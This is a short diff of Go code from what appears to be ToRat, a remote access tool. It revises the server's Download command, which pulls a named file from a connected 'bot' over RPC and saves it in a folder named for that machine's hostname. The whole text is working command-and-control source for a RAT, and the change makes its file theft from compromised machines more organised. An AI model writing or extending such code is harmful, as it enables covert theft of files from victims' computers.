@@ -141,26 +141,41 @@ func (client *activeClient) Cd(c *ishell.Context) {
 
 // DOWNLOAD A REMOTE FILE
 func (client *activeClient) Download(c *ishell.Context) {
+	var r models.File
+	arg := strings.Join(c.Args, " ")
+
 	c.ProgressBar().Indeterminate(true)
 	c.ProgressBar().Start()
-	filename := strings.Join(c.Args, " ")
-	var r models.File
-	err := client.RPC.Call("API.SendFile", filename, &r)
+
+	err := client.RPC.Call("API.SendFile", arg, &r)
 	if err != nil {
 		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server!"))
 		c.ProgressBar().Stop()
 		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
+		return
 	}
-	path := filepath.Join(client.Client.Path, filename)
-	err = ioutil.WriteFile(path, r.Content, 0600)
+
+	dl_path := filepath.Join("/ToRat/cmd/server/bots/", client.Client.Hostname, r.Fpath)
+	dl_dir, _ := filepath.Split(dl_path)
+
+	err = os.MkdirAll(dl_dir, os.ModePerm)
+	if err != nil {
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path!"))
+		c.ProgressBar().Stop()
+		c.Println(green("[Server] ") + red("[!] ", err))
+		return
+	}
+
+	err = ioutil.WriteFile(dl_path, r.Content, 0600)
 	if err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
+		return
 	}
+
 	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
 	c.ProgressBar().Stop()
-
 }
 
 // UPLOAD A FILE FROM SERVER TO CLIENT
